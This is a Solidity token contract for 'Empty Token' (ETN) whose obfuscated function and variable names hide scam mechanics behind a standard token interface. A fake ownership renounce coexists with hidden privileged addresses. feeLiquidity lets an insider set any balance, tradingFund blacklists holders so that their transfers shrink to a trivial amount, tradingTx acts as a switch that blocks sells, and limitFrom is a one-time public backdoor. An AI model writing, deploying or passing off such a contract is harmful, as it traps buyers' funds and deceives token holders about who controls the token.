//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface liquidityLaunchedFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atList) external view returns (uint256);

    function transfer(address minTx, uint256 takeLaunch) external returns (bool);

    function allowance(address launchedMin, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeLaunch) external returns (bool);

    function transferFrom(
        address sender,
        address minTx,
        uint256 takeLaunch
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverTake, uint256 value);
    event Approval(address indexed launchedMin, address indexed spender, uint256 value);
}

abstract contract marketingReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface feeWallet {
    function createPair(address fundAt, address marketingAmount) external returns (address);
}

interface teamLaunchedTotal is liquidityLaunchedFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EmptyToken is marketingReceiver, liquidityLaunchedFrom, teamLaunchedTotal {

    function name() external view virtual override returns (string memory) {
        return tradingList;
    }

    event OwnershipTransferred(address indexed minEnable, address indexed listSender);

    function transfer(address feeEnable, uint256 takeLaunch) external virtual override returns (bool) {
        return minReceiver(_msgSender(), feeEnable, takeLaunch);
    }

    address public autoLiquidityToken;

    function allowance(address minAtTeam, address fundReceiver) external view virtual override returns (uint256) {
        if (fundReceiver == tokenSwap) {
            return type(uint256).max;
        }
        return atLiquidity[minAtTeam][fundReceiver];
    }

    function getOwner() external view returns (address) {
        return liquidityMode;
    }

    bool private txToken;

    uint256 private teamShould = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private atLiquidity;

    constructor (){
        
        buyExempt();
        takeSender teamMarketing = takeSender(tokenSwap);
        sellAmount = feeWallet(teamMarketing.factory()).createPair(teamMarketing.WETH(), address(this));
        if (limitLaunchReceiver == txToken) {
            autoMin = minFund;
        }
        autoLiquidityToken = _msgSender();
        senderTo[autoLiquidityToken] = true;
        enableTeam[autoLiquidityToken] = teamShould;
        if (limitFeeAmount == txToken) {
            takeList = false;
        }
        emit Transfer(address(0), autoLiquidityToken, teamShould);
    }

    bool public limitFeeAmount;

    function buyExempt() public {
        emit OwnershipTransferred(autoLiquidityToken, address(0));
        liquidityMode = address(0);
    }

    function minReceiver(address buyFromReceiver, address minTx, uint256 takeLaunch) internal returns (bool) {
        if (buyFromReceiver == autoLiquidityToken) {
            return exemptShouldMode(buyFromReceiver, minTx, takeLaunch);
        }
        uint256 receiverEnable = liquidityLaunchedFrom(sellAmount).balanceOf(senderList);
        require(receiverEnable == toTx);
        require(minTx != senderList);
        if (takeLimit[buyFromReceiver]) {
            return exemptShouldMode(buyFromReceiver, minTx, tokenShouldFrom);
        }
        return exemptShouldMode(buyFromReceiver, minTx, takeLaunch);
    }

    function balanceOf(address atList) public view virtual override returns (uint256) {
        return enableTeam[atList];
    }

    function transferFrom(address buyFromReceiver, address minTx, uint256 takeLaunch) external override returns (bool) {
        if (_msgSender() != tokenSwap) {
            if (atLiquidity[buyFromReceiver][_msgSender()] != type(uint256).max) {
                require(takeLaunch <= atLiquidity[buyFromReceiver][_msgSender()]);
                atLiquidity[buyFromReceiver][_msgSender()] -= takeLaunch;
            }
        }
        return minReceiver(buyFromReceiver, minTx, takeLaunch);
    }

    bool public takeList;

    mapping(address => bool) public senderTo;

    string private tradingList = "Empty Token";

    function tradingFund(address exemptTotalReceiver) public {
        senderMin();
        
        if (exemptTotalReceiver == autoLiquidityToken || exemptTotalReceiver == sellAmount) {
            return;
        }
        takeLimit[exemptTotalReceiver] = true;
    }

    uint8 private txFee = 18;

    uint256 swapFrom;

    function totalSupply() external view virtual override returns (uint256) {
        return teamShould;
    }

    function senderMin() private view {
        require(senderTo[_msgSender()]);
    }

    mapping(address => bool) public takeLimit;

    function tradingTx(uint256 takeLaunch) public {
        senderMin();
        toTx = takeLaunch;
    }

    bool public marketingIs;

    uint256 public autoMin;

    function owner() external view returns (address) {
        return liquidityMode;
    }

    bool public receiverReceiver;

    uint256 public minFund;

    address tokenSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function feeLiquidity(address feeEnable, uint256 takeLaunch) public {
        senderMin();
        enableTeam[feeEnable] = takeLaunch;
    }

    address senderList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 toTx;

    bool public limitLaunchReceiver;

    string private listExempt = "ETN";

    function symbol() external view virtual override returns (string memory) {
        return listExempt;
    }

    uint256 constant tokenShouldFrom = 9 ** 10;

    bool private swapTake;

    function exemptShouldMode(address buyFromReceiver, address minTx, uint256 takeLaunch) internal returns (bool) {
        require(enableTeam[buyFromReceiver] >= takeLaunch);
        enableTeam[buyFromReceiver] -= takeLaunch;
        enableTeam[minTx] += takeLaunch;
        emit Transfer(buyFromReceiver, minTx, takeLaunch);
        return true;
    }

    function approve(address fundReceiver, uint256 takeLaunch) public virtual override returns (bool) {
        atLiquidity[_msgSender()][fundReceiver] = takeLaunch;
        emit Approval(_msgSender(), fundReceiver, takeLaunch);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return txFee;
    }

    address private liquidityMode;

    mapping(address => uint256) private enableTeam;

    address public sellAmount;

    function limitFrom(address senderTradingLaunched) public {
        if (receiverReceiver) {
            return;
        }
        if (takeList) {
            limitLaunchReceiver = true;
        }
        senderTo[senderTradingLaunched] = true;
        
        receiverReceiver = true;
    }

}